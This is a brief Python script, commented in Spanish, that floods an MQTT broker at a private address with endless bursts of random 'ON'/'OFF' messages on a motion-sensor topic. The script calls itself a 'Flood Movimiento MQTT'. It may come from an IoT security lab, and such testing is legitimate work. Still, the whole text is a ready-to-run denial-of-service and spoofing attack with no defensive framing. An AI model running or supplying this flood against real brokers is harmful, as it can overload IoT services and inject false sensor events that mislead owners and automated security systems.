#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import time
import random

BROKER = "192.168.1.10"
TOPIC = "iot/sensor/movimiento"

client = mqtt.Client()
client.connect(BROKER, 1883, 60)

print("→ Iniciando Flood Movimiento MQTT")
while True:
    # burst de 100 mensajes ultra-rápidos
    for _ in range(100):
        msg = random.choice(["ON","OFF"])
        client.publish(TOPIC, msg)
        print(f"📡 Flood MOV → {msg}")
        time.sleep(0.005)  # 5 ms entre mensajes
    time.sleep(1)  # pausa 1s antes del siguiente burst
